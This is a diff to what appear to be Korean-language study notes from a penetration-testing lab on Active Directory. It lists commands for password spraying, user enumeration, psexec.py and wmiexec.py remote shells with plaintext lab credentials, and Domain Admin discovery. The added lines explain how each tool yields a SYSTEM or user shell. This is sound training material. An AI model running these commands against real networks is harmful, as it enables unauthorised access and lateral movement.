@@ -175,10 +175,12 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 ```rpcclient $> queryuser 0x457```
 
 ### Psexec.py로 호스트 연결 (로컬 관리자 권한 사용자 필요)
-```psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125```
+```psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125```<br/>
+: 임의의 실행파일을 대상 호스트의 `ADMIN$` 공유에 업로드하여 원격 서비스를 생성, SYSTEM 쉘 획득
 
 ### wmiexec.py를 사용
 ```wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5```
+: SYSTEM이 아닌 사용자 계정으로 쉘 실행, 은밀하지만 cmd.exe 생성 로그가 남음
 
 ### Windapsearch - Domain Admins
 ```python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da```
